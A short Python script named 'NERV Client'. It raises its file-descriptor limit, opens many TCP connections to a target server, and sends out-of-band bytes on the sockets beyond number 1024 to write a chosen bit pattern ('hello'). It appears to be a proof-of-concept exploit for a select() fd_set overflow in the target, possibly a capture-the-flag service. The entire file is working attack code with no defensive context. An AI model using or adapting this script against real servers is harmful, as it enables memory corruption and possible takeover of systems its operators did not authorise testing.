#!/usr/bin/env python3

import argparse
import socket
import sys
import resource

def increase_open_files_limit():
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")

def main():
    parser = argparse.ArgumentParser(description='NERV Client')
    parser.add_argument('host', help='IP or hostname')
    parser.add_argument('-p', metavar='port', type=int, default=2000,
                        help='TCP port (default 2000)')
    parser.add_argument('-n', '--num_clients', metavar='num_clients', type=int, default=32,
                        help='Number of clients (default 32)')
    args = parser.parse_args()

    increase_open_files_limit()

    # Create TCP/IP sockets and connect
    sockets = []
    for i in range(args.num_clients):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((args.host, args.p))
            sockets.append(sock)
            print(".", end='', flush=True, file=sys.stderr)
        except Exception as e:
            print(f"\n[{i+1}] Error connecting to {args.host}:{args.p}: {e}", file=sys.stderr)
            break

    print(f"\nConnected {len(sockets)} sockets")
    print(f"Attempting to set bit pattern using OOB data")
    # Send data
    message = "hello"
    # Convert message to a bit string, 8 bits per character
    message_bits = ''.join(f"{ord(c):08b}" for c in message)
    overflow_sockets = sockets[1024:]
    print(f"We have {len(sockets)} sockets, {len(overflow_sockets)} overflow sockets")
    if len(overflow_sockets) < len(message_bits):
        print(f"Error: not enough sockets to send message")
        return
    for bit, sock in zip(message_bits, overflow_sockets):
        if bit == '1':
            sock.send(b'1', socket.MSG_OOB)

    print(f"Sent {len(message_bits)} bits of OOB data. Press enter to finish.")

    # Wait for user to press enter
    input()
    # Close sockets
    for sock in sockets:
        sock.close()

if __name__ == '__main__':
    main()

